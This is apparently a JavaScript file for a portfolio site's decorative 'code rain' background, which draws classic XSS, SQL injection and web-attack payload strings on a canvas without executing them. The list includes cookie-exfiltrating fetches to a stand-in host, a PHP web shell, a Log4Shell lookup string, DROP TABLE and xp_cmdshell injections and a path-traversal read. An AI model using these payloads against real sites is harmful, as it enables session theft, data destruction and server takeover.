// "Code rain" background made of classic XSS / SQL injection / web-scripting payloads, streaming
// left to right so each payload reads normally. Modelled on the SWE hero of kartheekkmukkavilli.com:
// fading trails, bright heads and a dark centre vignette. Characters near the cursor brighten.
// The strings are only drawn on a canvas; nothing here is ever executed.
(function () {
    const PAYLOADS = [
        // XSS
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '<svg/onload=alert(document.domain)>',
        'javascript:alert(document.cookie)',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(\'XSS\')>',
        '"><script>fetch(\'//x.io/?c=\'+document.cookie)</script>',
        '<a href="javascript:void(0)" onmouseover=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '\'-alert(1)-\'',
        // SQL injection
        '\' OR \'1\'=\'1\' --',
        '\' UNION SELECT username, password FROM users --',
        'admin\'--',
        '1; DROP TABLE users; --',
        '\' OR 1=1#',
        '" OR ""="',
        '1\' AND SLEEP(5)--',
        '\' UNION SELECT NULL, @@version --',
        '\'; EXEC xp_cmdshell(\'dir\'); --',
        '1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0',
        // web scripting / misc
        'document.cookie',
        'eval(atob(\'YWxlcnQoMSk=\'))',
        'fetch(\'/api/admin\', {credentials:\'include\'})',
        'window.location=\'//evil.io\'',
        '<?php system($_GET[\'cmd\']); ?>',
        '../../../../etc/passwd',
        '{{7*7}}',
        '${jndi:ldap://x.io/a}',
        'localStorage.getItem(\'token\')',
        'new Image().src=\'//x.io/?\'+document.cookie',
    ];

    const ROW_H = 14, TRAIL = 110, FONT = "13px 'JetBrains Mono', ui-monospace, monospace";
    const RED = [255, 68, 51], VIOLET = [184, 85, 255], HEAD = [255, 228, 222];
    const HOVER_RADIUS = 180;

    function rgba(c, a) {
        return 'rgba(' + c[0] + ',' + c[1] + ',' + c[2] + ',' + a.toFixed(3) + ')';
    }

    function pick(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    function mount(host) {
        const canvas = document.createElement('canvas');
        canvas.className = 'payload-rain';
        canvas.setAttribute('aria-hidden', 'true');
        host.insertBefore(canvas, host.firstChild);

        const ctx = canvas.getContext('2d');
        const isHome = host.classList.contains('hero');
        const strength = isHome ? 1 : 0.6;        // calmer behind long text
        const focusX = isHome ? 0.5 : 0.4;          // home text is centred
        const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        const mouse = { x: -9999, y: -9999 };
        let w = 0, h = 0, charW = 8, rows = [];

        function stream(head) {
            return { head: head, text: pick(PAYLOADS) + '   ', color: Math.random() < 0.7 ? RED : VIOLET };
        }

        // One stream per row; the next one starts only after it has fully left the screen.
        function newRow() {
            // first fill: streams already spread across the screen so it is populated immediately
            return { speed: 30 + 40 * Math.random(), streams: [stream(Math.random() * (w / charW + TRAIL))] };
        }

        function resize() {
            const dpr = window.devicePixelRatio || 1;
            w = window.innerWidth;
            h = window.innerHeight;
            canvas.width = Math.max(1, w * dpr);
            canvas.height = Math.max(1, h * dpr);
            ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
            ctx.font = FONT;
            ctx.textBaseline = 'top';
            charW = ctx.measureText('M').width || 8;
            rows = Array.from({ length: Math.ceil(h / ROW_H) }, newRow);
        }

        function frame(dt) {
            ctx.clearRect(0, 0, w, h);
            rows.forEach(function (row, i) {
                const y = i * ROW_H;
                if (row.streams.length === 0) row.streams.push(stream(-Math.random() * 6));
                row.streams.forEach(function (st, j) {
                    st.head += dt * row.speed;
                    // the stream behind cuts this trail off just short of its own head
                    const behind = row.streams[j + 1];
                    const len = behind ? Math.min(TRAIL, Math.floor(st.head - behind.head) - 3) : TRAIL;   // keep a small gap
                    for (let k = 0; k < len; k++) {
                        const col = Math.floor(st.head) - k;     // trail sits to the left of the head
                        if (col < 0) break;
                        const x = col * charW;
                        if (x > w) continue;
                        const ch = st.text[col % st.text.length];
                        if (ch === ' ') continue;
                        const dist = Math.hypot(x - mouse.x, y - mouse.y);
                        const boost = 1 + 1.6 * Math.max(0, 1 - dist / HOVER_RADIUS);
                        const a = k === 0 ? 0.9 : (1 - k / TRAIL) * 0.5;
                        ctx.fillStyle = rgba(k === 0 ? HEAD : st.color, Math.min(1, a * strength * boost));
                        ctx.fillText(ch, x, y);
                    }
                });
                // drop streams whose whole trail has left the screen
                while (row.streams.length && (row.streams[0].head - TRAIL) * charW > w) row.streams.shift();
            });
            // dark vignette behind the text keeps it readable
            const cx = w * focusX, cy = h / 2;
            const g = ctx.createRadialGradient(cx, cy, 0, cx, cy, 0.6 * Math.max(w, h));
            g.addColorStop(0, 'rgba(10,10,10,0.75)');
            g.addColorStop(0.4, 'rgba(10,10,10,0.4)');
            g.addColorStop(1, 'rgba(10,10,10,0)');
            ctx.fillStyle = g;
            ctx.fillRect(0, 0, w, h);
        }

        resize();
        // resizing a canvas clears it, so redraw straight away (matters for the static reduced-motion frame)
        window.addEventListener('resize', function () {
            resize();
            frame(0);
        });
        window.addEventListener('mousemove', function (e) {
            mouse.x = e.clientX;
            mouse.y = e.clientY;
        });
        document.addEventListener('mouseleave', function () {
            mouse.x = mouse.y = -9999;
        });

        if (reduced) {
            frame(0);
            return;
        }

        let last = performance.now();
        function loop(now) {
            const dt = Math.min(0.064, (now - last) / 1000);
            last = now;
            frame(dt);
            requestAnimationFrame(loop);
        }
        requestAnimationFrame(loop);
    }

    document.querySelectorAll('.hero, .page-hero').forEach(function (el) {
        if (!el.hasAttribute('data-no-rain')) mount(el);
    });
})();
